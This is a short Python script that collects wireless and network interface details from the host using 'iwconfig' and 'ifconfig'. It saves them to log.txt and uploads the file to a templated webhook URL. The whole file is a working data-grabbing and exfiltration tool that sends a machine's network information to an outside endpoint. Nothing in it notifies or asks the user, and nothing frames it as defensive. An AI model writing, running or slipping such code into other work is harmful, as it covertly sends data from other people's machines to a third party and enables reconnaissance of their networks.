import subprocess
import requests

def collect_info():
    info = {}

    # WLAN Information (Linux/Mac)
    try:
        wlan_info = subprocess.check_output(["iwconfig"], text=True)
        info['WLAN Information'] = wlan_info
    except subprocess.CalledProcessError as e:
        info['WLAN Information'] = f"Error collecting WLAN info: {e}"

    # IP Addresses and Network Information
    try:
        network_info = subprocess.check_output(["ifconfig"], text=True)
        info['Network Information'] = network_info
    except subprocess.CalledProcessError as e:
        info['Network Information'] = f"Error collecting Network info: {e}"

    return info

def send_data_to_webhook():
    webhook_url = "{webhook_url}"
    info = collect_info()
    
    # Save collected information to a file
    with open("log.txt", "w", encoding='utf-8') as log_file:
        for section, content in info.items():
            log_file.write(f"\n================== {section} ==================\n")
            log_file.write(content)
    
    # Send the file to the webhook
    with open("log.txt", "rb") as file:
        files = {
            "file": ("log.txt", file)
        }
        response = requests.post(webhook_url, files=files)
        if response.status_code == 200:
            print("Data successfully sent to webhook.")
        else:
            print(f"Failed to send data: {response.status_code}")

if __name__ == "__main__":
    send_data_to_webhook()
